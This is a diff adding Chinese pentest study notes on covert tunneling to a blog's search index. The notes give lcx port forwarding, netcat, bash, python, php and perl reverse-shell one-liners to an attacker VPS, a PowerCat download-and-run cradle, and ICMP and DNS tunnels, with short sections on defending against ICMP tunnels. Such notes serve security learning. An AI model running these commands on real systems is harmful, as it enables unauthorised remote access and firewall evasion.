@@ -17,6 +17,293 @@
       </tags>
   </entry>
   <entry>
+    <title>传输层隧道技术</title>
+    <url>/2022/05/04/3.3%20%E4%BC%A0%E8%BE%93%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/</url>
+    <content><![CDATA[<h1 id="传输层隧道技术"><a href="#传输层隧道技术" class="headerlink" title="传输层隧道技术"></a>传输层隧道技术</h1><p>传输层技术包括tcp隧道、udp隧道和常规端口转发。在渗透测试中，如果内网防火墙阻止了对指定端口的访问，在获得目标机器的权限后，可以使用IPTABles打开指定端口。</p>
+<h2 id="1-lcx端口转发"><a href="#1-lcx端口转发" class="headerlink" title="1 lcx端口转发"></a>1 lcx端口转发</h2><p>下载地址：<a href="https://github.com/UndefinedIdentifier/LCX" target="_blank" rel="noopener">https://github.com/UndefinedIdentifier/LCX</a></p>
+<a id="more"></a>
+
+<h3 id="1-1-内网端口转发"><a href="#1-1-内网端口转发" class="headerlink" title="1.1 内网端口转发"></a>1.1 内网端口转发</h3><p>在受害机上执行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lcx.exe -slave 192.168.1.4(攻击机公网主机IP) 4444 127.0.0.1 3389</span><br></pre></td></tr></table></figure>
+
+<p>这条命令的意思就是将本机的3389端口转发到攻击机的4444端口上</p>
+<p>之后在攻击机上执行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lcx.exe -listen 4444 5555</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-2-本地端口映射"><a href="#1-2-本地端口映射" class="headerlink" title="1.2 本地端口映射"></a>1.2 本地端口映射</h3><p>由于部分端口受防火墙限制，可以将目标服务器相应端口的数据透传到防火墙允许的其他端口，在目标主机上执行如下命令。就可以直接从远程桌面连接目标主机的53端口。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lcx -tran 53 &lt;目标主机IP地址&gt; 3389</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-netcat"><a href="#2-netcat" class="headerlink" title="2 netcat"></a>2 netcat</h2><p>安装</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo yum install nc.x86_64</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-1-命令查询"><a href="#2-1-命令查询" class="headerlink" title="2.1 命令查询"></a>2.1 命令查询</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -h</span><br><span class="line">-g&lt;网关&gt;：设置路由器跃程通信网关，最多设置8个;</span><br><span class="line">-G&lt;指向器数目&gt;：设置来源路由指向器，其数值为4的倍数;</span><br><span class="line">-h：在线帮助;</span><br><span class="line">-i&lt;延迟秒数&gt;：设置时间间隔，以便传送信息及扫描通信端口;</span><br><span class="line">-l：使用监听模式，监控传入的资料;</span><br><span class="line">-n：直接使用ip地址，而不通过域名服务器;</span><br><span class="line">-o&lt;输出文件&gt;：指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存;</span><br><span class="line">-p&lt;通信端口&gt;：设置本地主机使用的通信端口;</span><br><span class="line">-r：指定源端口和目的端口都进行随机的选择;</span><br><span class="line">-s&lt;来源位址&gt;：设置本地主机送出数据包的IP地址;</span><br><span class="line">-u：使用UDP传输协议;</span><br><span class="line">-v：显示指令执行过程;</span><br><span class="line">-w&lt;超时秒数&gt;：设置等待连线的时间;</span><br><span class="line">-z：使用0输入&#x2F;输出模式，只在扫描通信端口时使用。</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-2-简易使用"><a href="#2-2-简易使用" class="headerlink" title="2.2 简易使用"></a>2.2 简易使用</h3><p>Banner抓取</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -nv 192.168.137.1 21</span><br></pre></td></tr></table></figure>
+
+<p>连接远程主机</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -nvv 192.168.131.1 80</span><br></pre></td></tr></table></figure>
+
+<p>端口扫描</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">单个端口扫描：</span><br><span class="line">nc -v 192.168.131.1 80</span><br><span class="line">扫描端口段（速度慢）：</span><br><span class="line">nc -v -z 192.168.137.1 20-1024</span><br></pre></td></tr></table></figure>
+
+<p>端口监听</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -l -p 9999</span><br></pre></td></tr></table></figure>
+
+<p>文件传输</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">主机vps输入监听：</span><br><span class="line">nc -lp 333 &gt; 1.txt</span><br><span class="line">目标传输一个名为test.txt的文件</span><br><span class="line">nc -vn 192.168.137.1 333 &lt; test.txt -q 1</span><br></pre></td></tr></table></figure>
+
+<p>简易聊天</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">主机vps输入监听：</span><br><span class="line">nc -l -p 888</span><br><span class="line">目标主机输入：</span><br><span class="line">nc -vn 192.168.137.1 888</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-3-获取shell"><a href="#2-3-获取shell" class="headerlink" title="2.3 获取shell"></a>2.3 获取shell</h3><h4 id="正向shell"><a href="#正向shell" class="headerlink" title="正向shell"></a>正向shell</h4><p>输入以下命令，监听目标主机的4444端口</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 4444 -e &#x2F;bin&#x2F;sh            &#x2F;&#x2F;Linux</span><br><span class="line">nc -lvp 4444 -e c:\windows\system\cmd.exe            &#x2F;&#x2F;windows</span><br></pre></td></tr></table></figure>
+
+<p>在本地或VPS主机上来连接目标主机的4444端口</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc 192.168.137.100 4444</span><br></pre></td></tr></table></figure>
+
+<h4 id="反向shell"><a href="#反向shell" class="headerlink" title="反向shell"></a>反向shell</h4><p>输入以下命令，在本地或VPS主机上监听本地9999端口</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 9999</span><br></pre></td></tr></table></figure>
+
+<p>在目标主机中输入以下命令，连接VPS主机192.168.137.1的9999端口</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc 192.168.137.1 9999 -e &#x2F;bin&#x2F;sh                       &#x2F;&#x2F;Linux</span><br><span class="line">nc 192.168.137.1 9999 -e c:\windows\system32\cmd.exe    &#x2F;&#x2F;windows</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-4-在目标主机中没有nc时获取反向shell"><a href="#2-4-在目标主机中没有nc时获取反向shell" class="headerlink" title="2.4 在目标主机中没有nc时获取反向shell"></a>2.4 在目标主机中没有nc时获取反向shell</h3><h4 id="（1）python反向shell"><a href="#（1）python反向shell" class="headerlink" title="（1）python反向shell"></a>（1）python反向shell</h4><p>在VPS上监听本地2222端口</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 2222</span><br></pre></td></tr></table></figure>
+
+<p>在目标主机上执行如下命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;VPS_ip&quot;,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure>
+
+<h4 id="（2）Bash反向shell"><a href="#（2）Bash反向shell" class="headerlink" title="（2）Bash反向shell"></a>（2）Bash反向shell</h4><p>在VPS上监听本地4444端口</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>
+
+<p>在目标主机上执行如下命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.137.1&#x2F;4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<h4 id="（3）php反向shell"><a href="#（3）php反向shell" class="headerlink" title="（3）php反向shell"></a>（3）php反向shell</h4><p>在VPS上监听本地2222端口</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 2222</span><br></pre></td></tr></table></figure>
+
+<p>在目标主机上执行如下命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;192.168.137.1&quot;,2222);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br></pre></td></tr></table></figure>
+
+<h4 id="（4）perl反向shell"><a href="#（4）perl反向shell" class="headerlink" title="（4）perl反向shell"></a>（4）perl反向shell</h4><p>在VPS上监听本地4444端口</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>
+
+<p>在目标主机上执行如下命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">perl -e &#39;use Socket;$i&#x3D;&quot;VPS_ip&quot;;$p&#x3D;9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-5-内网代理"><a href="#2-5-内网代理" class="headerlink" title="2.5 内网代理"></a>2.5 内网代理</h3><p>在VPS中输入如下命令，监听3333端口</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 3333</span><br></pre></td></tr></table></figure>
+
+<p>接着在内网服务器执行如下命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 3333 -e &#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>
+
+<p>在边界服务器上执行如下命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -v 192.168.137.100(边界服务器出口ip) 3333 -c &quot;nc -v 10.10.10.200(内网服务器ip) 3333&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-PowerCat"><a href="#3-PowerCat" class="headerlink" title="3 PowerCat"></a>3 PowerCat</h2><p>PowerCat下载地址：<a href="https://github.com/besimorhino/powercat.git" target="_blank" rel="noopener">https://github.com/besimorhino/powercat.git</a></p>
+<p>设置权限</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Set-ExecutionPolicy RemoteSigned</span><br></pre></td></tr></table></figure>
+
+<p>使用前先导入 ps脚本</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\powercat.ps1</span><br></pre></td></tr></table></figure>
+
+<p>powercat部分参数介绍</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-c 指定一个ip地址</span><br><span class="line">-p 指定一个端口</span><br><span class="line">-v 显示详情</span><br><span class="line">-l 监听模式</span><br><span class="line">-e 程序重定向</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-1-通过nc正向连接Powercat"><a href="#3-1-通过nc正向连接Powercat" class="headerlink" title="3.1 通过nc正向连接Powercat"></a>3.1 通过nc正向连接Powercat</h3><p>在目标服务器中执行以下命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powercat -l -p 8080 -e cmd.exe -v</span><br></pre></td></tr></table></figure>
+
+<p>在VPS中执行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netcat 边界服务器的出口ip 8080 -vv</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-2-通过nc反向连接powercat"><a href="#3-2-通过nc反向连接powercat" class="headerlink" title="3.2 通过nc反向连接powercat"></a>3.2 通过nc反向连接powercat</h3><p>在VPS执行下列命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netcat -l -p 8888 -vv</span><br></pre></td></tr></table></figure>
+
+<p>在win7（边界服务器）执行：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powercat -c 192.168.137.1（VPS的ip） -p 8888 -v -e cmd.exe</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-3-通过Powercat返回Powershell"><a href="#3-3-通过Powercat返回Powershell" class="headerlink" title="3.3 通过Powercat返回Powershell"></a>3.3 通过Powercat返回Powershell</h3><p>在Winserver2008（内网服务器）中执行：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">IEX(New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;1.1.1.10&#x2F;powercat.ps1&#39;)</span><br><span class="line">powercat -l -v -p 9999</span><br></pre></td></tr></table></figure>
+
+<p>在win7（边界服务器）中执行：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powercat -c 10.10.10.201（内网服务器ip） -p 9999 -v -ep</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-4-通过Powercat传输文件"><a href="#3-4-通过Powercat传输文件" class="headerlink" title="3.4 通过Powercat传输文件"></a>3.4 通过Powercat传输文件</h3><p>在win7（边界服务器）新建test.txt文件，放在c盘根目录，在winserver2008（内网服务器）中执行下列命令。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powercat -l -p 9999 -of test.txt -v</span><br></pre></td></tr></table></figure>
+
+<p>回到win7（边界服务器）中，执行如下命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powercat -c 10.10.10.201（内网服务器ip） -p 9999 -i c:\test.txt -v</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-5-用PowerCat生成Payload"><a href="#3-5-用PowerCat生成Payload" class="headerlink" title="3.5 用PowerCat生成Payload"></a>3.5 用PowerCat生成Payload</h3><p>在Win7（边界服务器）执行下面命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powercat -l -p 8000 -e cmd -v -g &gt;&gt; shell.ps1</span><br></pre></td></tr></table></figure>
+
+<p>将生成的ps1文件上传到Winserver2008（内网服务器）中并且执行，然后在win7中执行如下命令，就可以获得一个反弹shell：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powercat -c 10.10.10.201（内网服务器ip） -p 8000 -v</span><br></pre></td></tr></table></figure>
+
+<p>如果想反弹Powershell，可以执行如下命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powercat -l -p 8000 -ep -v -g &gt;&gt; shell.ps1</span><br></pre></td></tr></table></figure>
+
+<p>生成经过编码的Payload。在win7（边界服务器）执行如下命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powercat -c 10.10.10.201（内网服务器ip） -p 9999 -ep -ge</span><br></pre></td></tr></table></figure>
+
+<p>继续在win7（边界服务器）执行：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powercat -l -p 9999 -v</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-6-Powercat-DNS隧道通信"><a href="#3-6-Powercat-DNS隧道通信" class="headerlink" title="3.6 Powercat DNS隧道通信"></a>3.6 Powercat DNS隧道通信</h3><p>首先需要安装dnscat，然后在安装了dnscat的linux的VPS主机上执行如下命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ruby dnscat2.rb ttpowercat.test -e open --no-cache</span><br></pre></td></tr></table></figure>
+
+<p>然后在win7（边界服务器）上执行下面命令，就能看到dnscat上面的反弹shell：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powercat -c 192.168.137.1（攻击服务器VPS的ip） -p 53 -dns ttpowercat.test -e cmd.exe</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-7-将Powercat作为跳板"><a href="#3-7-将Powercat作为跳板" class="headerlink" title="3.7 将Powercat作为跳板"></a>3.7 将Powercat作为跳板</h3><p>将win7（边界服务器）作为跳板，让Kali（VPS）连接winserver2008（内网服务器）。首先，在winserver2008（内网服务器）中执行：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powercat -l -v -p 9999 -e cmd.exe</span><br></pre></td></tr></table></figure>
+
+<p>然后在win7（边界服务器）中执行：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powercat -l -v -p 8000 -r tcp:10.10.10.201（内网服务器ip）:9999</span><br></pre></td></tr></table></figure>
+
+<p>最后，让kali（VPS）和win7（边界服务器）进行连接，win7（边界服务器）就可以将流量转发给winserver2008（内网服务器）。<br>在kali（VPS）输入：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc 192.168.137.100（边界服务器出口ip） 8000 -vv</span><br></pre></td></tr></table></figure>
+
+<p>成功连接。<br>在这里也可以使用DNS协议。在win7（边界服务器）中执行如下命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powercat -l -p 8000 -r dns::192.168.137.1（攻击服务器VPS的ip）::ttpowercat.test</span><br></pre></td></tr></table></figure>
+
+<p>在kali（VPS）中输入如下命令，启动dnscat</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ruby dnscat2.rb ttpowercat.test -e open --no-cache</span><br></pre></td></tr></table></figure>
+
+<p>在winserver2008内网服务器）中输入下面命令，就可以反弹shell了</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powercat -c -10.10.10.200（边界服务器的内网ip） -p 8000 -v -e cmd.exe</span><br></pre></td></tr></table></figure>
+
+
+]]></content>
+      <categories>
+        <category>内网</category>
+      </categories>
+      <tags>
+        <tag>内网</tag>
+        <tag>隧道</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>网络层隧道技术</title>
+    <url>/2022/05/04/3.2%20%E7%BD%91%E7%BB%9C%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/</url>
+    <content><![CDATA[<h1 id="网络层隧道技术"><a href="#网络层隧道技术" class="headerlink" title="网络层隧道技术"></a>网络层隧道技术</h1><h2 id="1-IPv6隧道"><a href="#1-IPv6隧道" class="headerlink" title="1 IPv6隧道"></a>1 IPv6隧道</h2><h3 id="1-1-技术简介"><a href="#1-1-技术简介" class="headerlink" title="1.1 技术简介"></a>1.1 技术简介</h3><p>IPv6隧道技术指的是通过IPv4隧道传送IPv6数据报文的技术，为了在IPv4的海洋中传输IPv6信息，可以将IPv4作为隧道载体，将IPv6报文整体封装在IPv4数据报文中，使IPv6能够穿越IPv4的海洋，到达另一个IPv6小岛。</p>
+<p>ipv6隧道技术是指通过ipv4隧道传送ipv6数据报文的技术。攻击者有时会通过恶意软件来配置允许运行ipv6通信的设备，以避开防火墙和入侵检测系统。有一点需要指出：即使设备支持ipv6，也可能无法正确地分析封装了ipv6报文的ipv4数据包。</p>
+<a id="more"></a>
+
+<p>支持IPv6的隧道工具有socat、6tunnel、nt6tunnel等。</p>
+<h3 id="1-2-防御ipv6-隧道攻击的方法"><a href="#1-2-防御ipv6-隧道攻击的方法" class="headerlink" title="1.2 防御ipv6 隧道攻击的方法"></a>1.2 防御ipv6 隧道攻击的方法</h3><p>针对ipv6隧道攻击，最好的防御方法是：了解ipv6的具体漏洞，结合其他协议，通过防火墙和深度防御系统过滤ipv6通信，提高主机和应用程序的安全性。</p>
+<h2 id="2-ICMP隧道"><a href="#2-ICMP隧道" class="headerlink" title="2 ICMP隧道"></a>2 ICMP隧道</h2><h3 id="2-1-icmpsh"><a href="#2-1-icmpsh" class="headerlink" title="2.1 icmpsh"></a>2.1 icmpsh</h3><p>工具 icmpsh，从机（客户端）只能在 Windows 上运行，而主机（服务器）可以在攻击者机器上的任何平台上运行。</p>
+<p>下载地址：<a href="https://github.com/inquisb/icmpsh.git" target="_blank" rel="noopener">https://github.com/inquisb/icmpsh.git</a></p>
+<p>安装python-impacket类库：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install python-impacket</span><br></pre></td></tr></table></figure>
+
+<p>关闭系统的ICMP应答（也就是禁ping）：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all&#x3D;1</span><br></pre></td></tr></table></figure>
+
+<p>VPS执行： </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;icmpsh_m.py &lt;外网VPS&gt; &lt;内网出口IP&gt;</span><br></pre></td></tr></table></figure>
+
+<p>内网服务器执行：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">icmpsh.exe -t &lt;外网VPS&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-2-pingtunnel"><a href="#2-2-pingtunnel" class="headerlink" title="2.2 pingtunnel"></a>2.2 pingtunnel</h3><p>PingTunnel也是一款常用的ICMP隧道工具，可以跨平台使用。为了避免隧道被滥用，可以为隧道设置密码。</p>
+<p>下载地址：<a href="http://freshmeat.sourceforge.net/projects/ptunnel/" target="_blank" rel="noopener">http://freshmeat.sourceforge.net/projects/ptunnel/</a></p>
+<p>首先要安装工具</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;www.cs.uit.no&#x2F;~daniels&#x2F;PingTunnel&#x2F;PingTunnel-0.72.tar.gz</span><br><span class="line">tar -xzvf PingTunnel-0.72.tar.gz</span><br><span class="line">cd PingTunnel</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>
+
+<p>如果报pcap.h缺失：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;www.tcpdump.org&#x2F;release&#x2F;libpcap-1.9.0.tar.gz </span><br><span class="line">tar zxvf libpcap-1.9.0.tar.gz </span><br><span class="line">cd libpcap-1.9.0 </span><br><span class="line">.&#x2F;configure</span><br></pre></td></tr></table></figure>
+
+<p>安装中出现yacc包错误</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install -y byacc</span><br></pre></td></tr></table></figure>
+
+<p>最后一步过程中又会报Neither flex nor lex was found的错误：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install flex bison</span><br></pre></td></tr></table></figure>
+
+<p>继续执行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
+
+<p>回到pingtunnel目录重新执行</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>
+
+<p>在web服务器运行命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ptunnel -x pass</span><br><span class="line"></span><br><span class="line">-× 指定icmp隧道连接验证密码</span><br><span class="line">-lp 指定要监听的本地tcp端口</span><br><span class="line">-da 指定要转发到的机器的ip地址</span><br><span class="line">-dp 指定要转发到的机器的tcp端口</span><br><span class="line">-p 指定icmp隧道另一端机器的ip地址</span><br></pre></td></tr></table></figure>
+
+<p>在vps（攻击机）上运行ptunnel</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ptunnel -p &lt;web服务器外网ip&gt; -lp 1080 -da &lt;域中内网服务器ip&gt; -dp 3389 -x pass</span><br></pre></td></tr></table></figure>
+
+<p>接下来访问vps（攻击机）的1080端口便可以连接到数据库服务器的远程桌面了(3389)</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;vps的ip&gt;:1080</span><br></pre></td></tr></table></figure>
+
+<p>PingTunnel工具在Windows环境中也可以使用，只不过需要在内网的Windows机器上安装wincap类库。</p>
+<h3 id="2-3-防御icmcp隧道攻击的方法"><a href="#2-3-防御icmcp隧道攻击的方法" class="headerlink" title="2.3 防御icmcp隧道攻击的方法"></a>2.3 防御icmcp隧道攻击的方法</h3><ol>
+<li>检测同一来源的icmp数据包的数量。一个正常的ping命令每秒最多发送两个数据包，而使用icmp隧道的浏览器会在很短的时间内产生上千个icmp数据包。</li>
+<li>注意那些payload大与64bit的icmp数据包。</li>
+<li>寻找响应数据包中的payload与请求数据包中的playload不一致的icmp数据包。</li>
+<li>检查icmp数据包协议，icmptunnel会在所有的icmp playload前面添加“TUNL来标识隧道–这就是特征。</li>
+</ol>
+]]></content>
+      <categories>
+        <category>内网</category>
+      </categories>
+      <tags>
+        <tag>内网</tag>
+        <tag>隧道</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>隐藏通信隧道基础知识</title>
+    <url>/2022/05/04/3.1%20%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
+    <content><![CDATA[<h1 id="隐藏通信隧道基础知识"><a href="#隐藏通信隧道基础知识" class="headerlink" title="隐藏通信隧道基础知识"></a>隐藏通信隧道基础知识</h1><h2 id="1-隐藏通信隧道概述"><a href="#1-隐藏通信隧道概述" class="headerlink" title="1 隐藏通信隧道概述"></a>1 隐藏通信隧道概述</h2><p>这里的隧道，就是一种绕过端口屏蔽的通信方式。</p>
+<p>常用的隧道列举：</p>
+<a id="more"></a>
+
+<ul>
+<li>网络层：IPv6隧道、ICMP隧道、GRE隧道</li>
+<li>传输层：TCP隧道、UDP隧道、常规端口转发</li>
+<li>应用层：SSH隧道、HTTP隧道、HTTPS隧道、DNS隧道</li>
+</ul>
+<h2 id="2-判断内网的连通性"><a href="#2-判断内网的连通性" class="headerlink" title="2 判断内网的连通性"></a>2 判断内网的连通性</h2><p>判断内网的连通性是指判断机器能否上外网等。</p>
+<p>需要综合各种协议（TCP、HTTP、DNS、ICMP等）和端口通信的情况。</p>
+<p>常规允许流出端口 ： 80、8080、443、53、110、123等。</p>
+<h3 id="2-1-ICMP"><a href="#2-1-ICMP" class="headerlink" title="2.1 ICMP"></a>2.1 ICMP</h3><p><code>ping</code> 命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping &lt;IP&#x2F;域名&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-2-TCP协议"><a href="#2-2-TCP协议" class="headerlink" title="2.2 TCP协议"></a>2.2 TCP协议</h3><p>netcat(简称:nc)被誉为网安界的“瑞士军刀”，是一个短小精悍的工具，通常使用TCP或UDP协议的网络连接读写数据。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc  &lt;ip  端口&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-3-HTTP协议"><a href="#2-3-HTTP协议" class="headerlink" title="2.3 HTTP协议"></a>2.3 HTTP协议</h3><p>curl是一个利用URL规则在命令行工作的综合文件传输工具，支持文件的上传和下载。</p>
+<p>curl命令不仅支持HTTP、HTTPS、FTP等众多协议，还支持POST、Cookie、认证、从指定偏移处下载部分文件、用户代理字符串、限速、文件大小、进度条等特征</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl &lt;ip地址：端口号&gt;</span><br><span class="line">如果远程主机开启了相应的端口，则会输出相应的端口信息，如果远程主机没有开通相应的端口，则没有任何提示，ctrl+c键可断开连接</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-4-DNS协议"><a href="#2-4-DNS协议" class="headerlink" title="2.4 DNS协议"></a>2.4 DNS协议</h3><p>在进行DNS连通性检测时，常用的命令为nslookup和dig</p>
+<p>nslookup是windows操作系统自带的dns探测命令，在没有指定vps-ip时，nslookup会从系统网络的TCP/IP属性中读取dns服务器的地址。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nslookup www.baidu.com vps-ip</span><br></pre></td></tr></table></figure>
+
+<p>dig是Linux默认自带的DNS探测命令，在没有指定的vps-ip时，dig会到/etc/resolv.conf文件中读取系统配置的DNS服务器的地址。如果vps-ip为192.168.43.1将解析百度网的IP地址，说明目前DNS协议是连通的，</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dig @vps-ip  www.baidu.com</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-5-proxy"><a href="#2-5-proxy" class="headerlink" title="2.5 proxy"></a>2.5 proxy</h3><p>还有一种情况是流量不能直接流出，需要在内网中设置代理服务器，常见于通过企业办公网段上网的场景。常用的判断方法如下</p>
+<ol>
+<li>查看网络连接，判断是否存在与其他机器的8080(不绝对)等端口的连接(可以尝试运行ping -n 1 -a ip )</li>
+<li>查看内网中是否有主机名类似于proxy的机器</li>
+<li>查看IE浏览器的直接代理</li>
+<li>根据pac文件的路径(可能是本地路径，也可能是远程路径)，将其下载下来并查看</li>
+<li>执行如下命令，利用curl工具进行确定</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl www.baidu.com  &#x2F;&#x2F;不通</span><br><span class="line">curl -x proxy-ip:port www.baidu.com  &#x2F;&#x2F;通</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>内网</category>
+      </categories>
+      <tags>
+        <tag>内网</tag>
+        <tag>隧道</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>内网信息收集</title>
     <url>/2022/04/10/2%20%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
     <content><![CDATA[<h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><h2 id="1-收集本机信息"><a href="#1-收集本机信息" class="headerlink" title="1 收集本机信息"></a>1 收集本机信息</h2><h3 id="1-1-手动收集信息"><a href="#1-1-手动收集信息" class="headerlink" title="1.1 手动收集信息"></a>1.1 手动收集信息</h3><p>查询网络配置信息</p>
